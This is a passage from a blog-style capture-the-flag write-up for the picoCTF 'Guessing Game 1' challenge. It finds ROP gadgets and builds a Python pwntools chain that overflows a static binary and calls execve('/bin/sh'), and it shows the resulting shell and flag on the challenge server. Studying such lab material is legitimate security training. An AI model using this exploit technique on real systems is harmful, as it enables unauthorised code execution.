</code></pre></div><p>Alright. Now we can start building the ROP chain. Since it is a static binary, we need to perform a <code>syscall</code> to execute <code>execve("/bin/sh", NULL, NULL);</code>. For that purpose, we need:</p><ul><li><code>$rax</code> to have a value of <code>0x3b</code></li><li><code>$rdi</code> to have a pointer to the string <code>"/bin/sh"</code></li><li><code>$rsi</code> to have a value of <code>0</code> (<code>NULL</code>)</li><li><code>$rdx</code> to have a value of <code>0</code> (<code>NULL</code>)</li></ul><p>We can use <code>ROPgadget</code> to find gadgets of the form <code>pop &lt;register> ; ret</code> and the <code>syscall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop r[ads][ix] ; ret$'</span>  
0x00000000004163f4 <span class="code-red">: pop rax ; ret</span>
0x0000000000400696 <span class="code-red">: pop rdi ; ret</span>
0x000000000044a6b5 <span class="code-red">: pop rdx ; ret</span>
0x0000000000410ca3 <span class="code-red">: pop rsi ; ret</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': syscall$'</span>
0x000000000040137c <span class="code-red">: syscall</span>
</code></pre></div><p>Now we need to find a writable memory space, such as <code>.bss</code>, to write the string <code>"/bin/sh"</code>. The address of <code>.bss</code> can be obtained with <code>readelf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -S <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'\.bss'</span>
  [26] <span class="code-red">.bss</span>              NOBITS           00000000006bc3a0  000bc398  
</code></pre></div><p>The last gadget we need is one to store <code>"/bin/sh"</code> to the address of <code>bss</code>. We need an instruction of the form <code>mov qword ptr [&lt;register>], &lt;register> ; ret</code>. Anyone of these will be useful:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vuln</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': mov .word ptr \[r..\], r.. ; ret$'</span>  
0x000000000048dd71 <span class="code-red">: mov qword ptr [rax], rdx ; ret</span>
0x000000000043608b <span class="code-red">: mov qword ptr [rdi], rcx ; ret</span>
0x0000000000436393 <span class="code-red">: mov qword ptr [rdi], rdx ; ret</span>
0x0000000000447d7b <span class="code-red">: mov qword ptr [rdi], rsi ; ret</span>
0x0000000000419127 <span class="code-red">: mov qword ptr [rdx], rax ; ret</span>
0x000000000047ff91 <span class="code-red">: mov qword ptr [rsi], rax ; ret</span>
</code></pre></div><p>I decided to use <code>mov qword ptr [rdx], rax ; ret</code>. Now, let&rsquo;s build the ROP chain in the Python exploit and send it:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bss</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">6bc3a0</span>

<span class="mtk1">pop_rdi_ret</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">400696</span>
<span class="mtk1">pop_rsi_ret</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">410ca3</span>
<span class="mtk1">pop_rdx_ret</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">44a6b5</span>
<span class="mtk1">pop_rax_ret</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">4163f4</span>

<span class="mtk1">mov_qword_ptr_rdx_rax_ret</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">419127</span>

<span class="mtk1">syscall</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">40137c</span>

<span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">120</span>
<span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

<span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rdx_ret</span><span class="mtk1">)</span>                <span class="mtk3">#</span> <span class="mtk3">$rdx</span> <span class="mtk3">=</span> <span class="mtk3">.bss</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">bss</span><span class="mtk1">)</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rax_ret</span><span class="mtk1">)</span>                <span class="mtk3">#</span> <span class="mtk3">$rax</span> <span class="mtk3">=</span> <span class="mtk3">"/bin/sh"</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">mov_qword_ptr_rdx_rax_ret</span><span class="mtk1">)</span>  <span class="mtk3">#</span> <span class="mtk3">Store</span> <span class="mtk3">"/bin/sh"</span> <span class="mtk3">in</span> <span class="mtk3">.bss</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rax_ret</span><span class="mtk1">)</span>                <span class="mtk3">#</span> <span class="mtk3">$rax</span> <span class="mtk3">=</span> <span class="mtk3">0x3b</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">3b</span><span class="mtk1">)</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>                <span class="mtk3">#</span> <span class="mtk3">$rdi</span> <span class="mtk3">=</span> <span class="mtk3">.bss</span> <span class="mtk3">(pointer</span> <span class="mtk3">to</span> <span class="mtk3">"/bin/sh")</span>  
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">bss</span><span class="mtk1">)</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rsi_ret</span><span class="mtk1">)</span>                <span class="mtk3">#</span> <span class="mtk3">$rsi</span> <span class="mtk3">=</span> <span class="mtk3">0</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rdx_ret</span><span class="mtk1">)</span>                <span class="mtk3">#</span> <span class="mtk3">$rdx</span> <span class="mtk3">=</span> <span class="mtk3">0</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">syscall</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Name?'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
</code></pre></div><p>If we run it locally, we will have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">┤</span>] Guessing number: 84
[<span class="code-green">+</span>] Guessed number: 84
[<span class="code-blue">*</span>] Switching to interactive mode  
<span class="code-red">$</span> ls
Makefile  solve.py  vuln  vuln.c
</code></pre></div><p>Perfect, now let&rsquo;s run it on the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> jupiter.challenges.picoctf.org 50581  
[<span class="code-blue">┤</span>] Guessing number: 84
[<span class="code-green">+</span>] Guessed number: 84
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
vuln
vuln.c
xinet_startup.sh
<span class="code-red">$</span> cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_1ed68bc5575f6be1}
</code></pre></div><p>The full exploit script can be found in here: <a href="https://github.com/7Rocky/CTF-scripts/blob/main/picoCTF%202020%20Mini-Competition/Binary%20Exploitation/Guessing%20Game%201/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div></article></main><footer class="bg-black bottom-0 w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>